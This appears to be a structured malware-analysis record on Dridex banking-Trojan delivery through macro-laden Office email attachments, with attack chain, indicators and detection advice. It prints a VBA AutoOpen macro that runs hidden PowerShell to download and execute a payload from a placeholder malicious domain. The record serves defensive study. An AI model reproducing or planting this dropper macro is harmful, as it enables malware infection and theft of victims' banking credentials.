package_info.package_manager: N/A (malicious macro document, delivered via email spam)
package_info.why_malicious: Dridex is a banking Trojan distributed via malicious macro documents in spam campaigns. It is designed to steal banking credentials and facilitate financial fraud by infecting victims' systems through deceptive emails and executing unauthorized code.

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim obj As Object
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload')"
End Sub
malicious_snippets.code_behavior: At document open (when macros are enabled), the macro spawns a hidden PowerShell process that downloads and executes a remote payload from a malicious domain, resulting in the installation of the Dridex banking Trojan.

malice_analysis.why_suspicious: Macros that execute PowerShell to download and run code from the internet are a common malware delivery technique.
malice_analysis.violated_expectations: Legitimate Office documents should not contain macros that download and execute code from external sources.
malice_analysis.similar_legitimate_use: Automated document processing in enterprise environments may use macros, but not for downloading and executing remote code.
key_indicators: AutoOpen macro triggers on document open
Use of Wscript.Shell to launch PowerShell
Download and execution of remote code

attack_chain.action: Victim receives a phishing email with a malicious Office document attachment.
attack_chain.leads_to: Victim opens the document and enables macros.

attack_chain.action: Malicious macro executes upon document open, launching a hidden PowerShell process.
attack_chain.leads_to: PowerShell downloads and executes the Dridex payload.

attack_chain.action: Dridex banking Trojan is installed on the victim's system.
attack_chain.leads_to: Credential theft and further malicious activity.

behavioral_signatures: Office macro spawning PowerShell or cmd.exe
PowerShell downloading and executing code from external URLs
Macros with AutoOpen or Document_Open triggers
file_indicators: Office documents with embedded macros (VBA code)
Presence of suspicious macro code invoking Wscript.Shell
Documents referencing external URLs in macro code
network_indicators: Outbound HTTP/HTTPS requests to known Dridex C2 domains
PowerShell making web requests to non-corporate domains
detection_knowledge.how_to_detect: Monitor for Office documents with macros that invoke PowerShell or cmd.exe, especially those that download and execute code from the internet. Use endpoint protection to block or alert on suspicious macro activity and network monitoring to detect outbound connections to known Dridex infrastructure.
